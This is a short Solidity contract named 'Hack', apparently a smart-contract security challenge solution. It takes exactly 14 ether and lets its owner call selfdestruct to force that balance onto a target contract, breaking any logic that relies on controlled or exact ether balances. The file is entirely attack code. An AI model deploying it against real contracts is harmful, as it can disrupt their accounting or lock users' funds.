// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Hack {
    address private owner;
    
    constructor() public payable{
        require(msg.value == 14 ether);
        owner = msg.sender;
    }

    function hack(address target) external {
        require(msg.sender == owner, "!Owner");
        selfdestruct(payable(target));
    }
}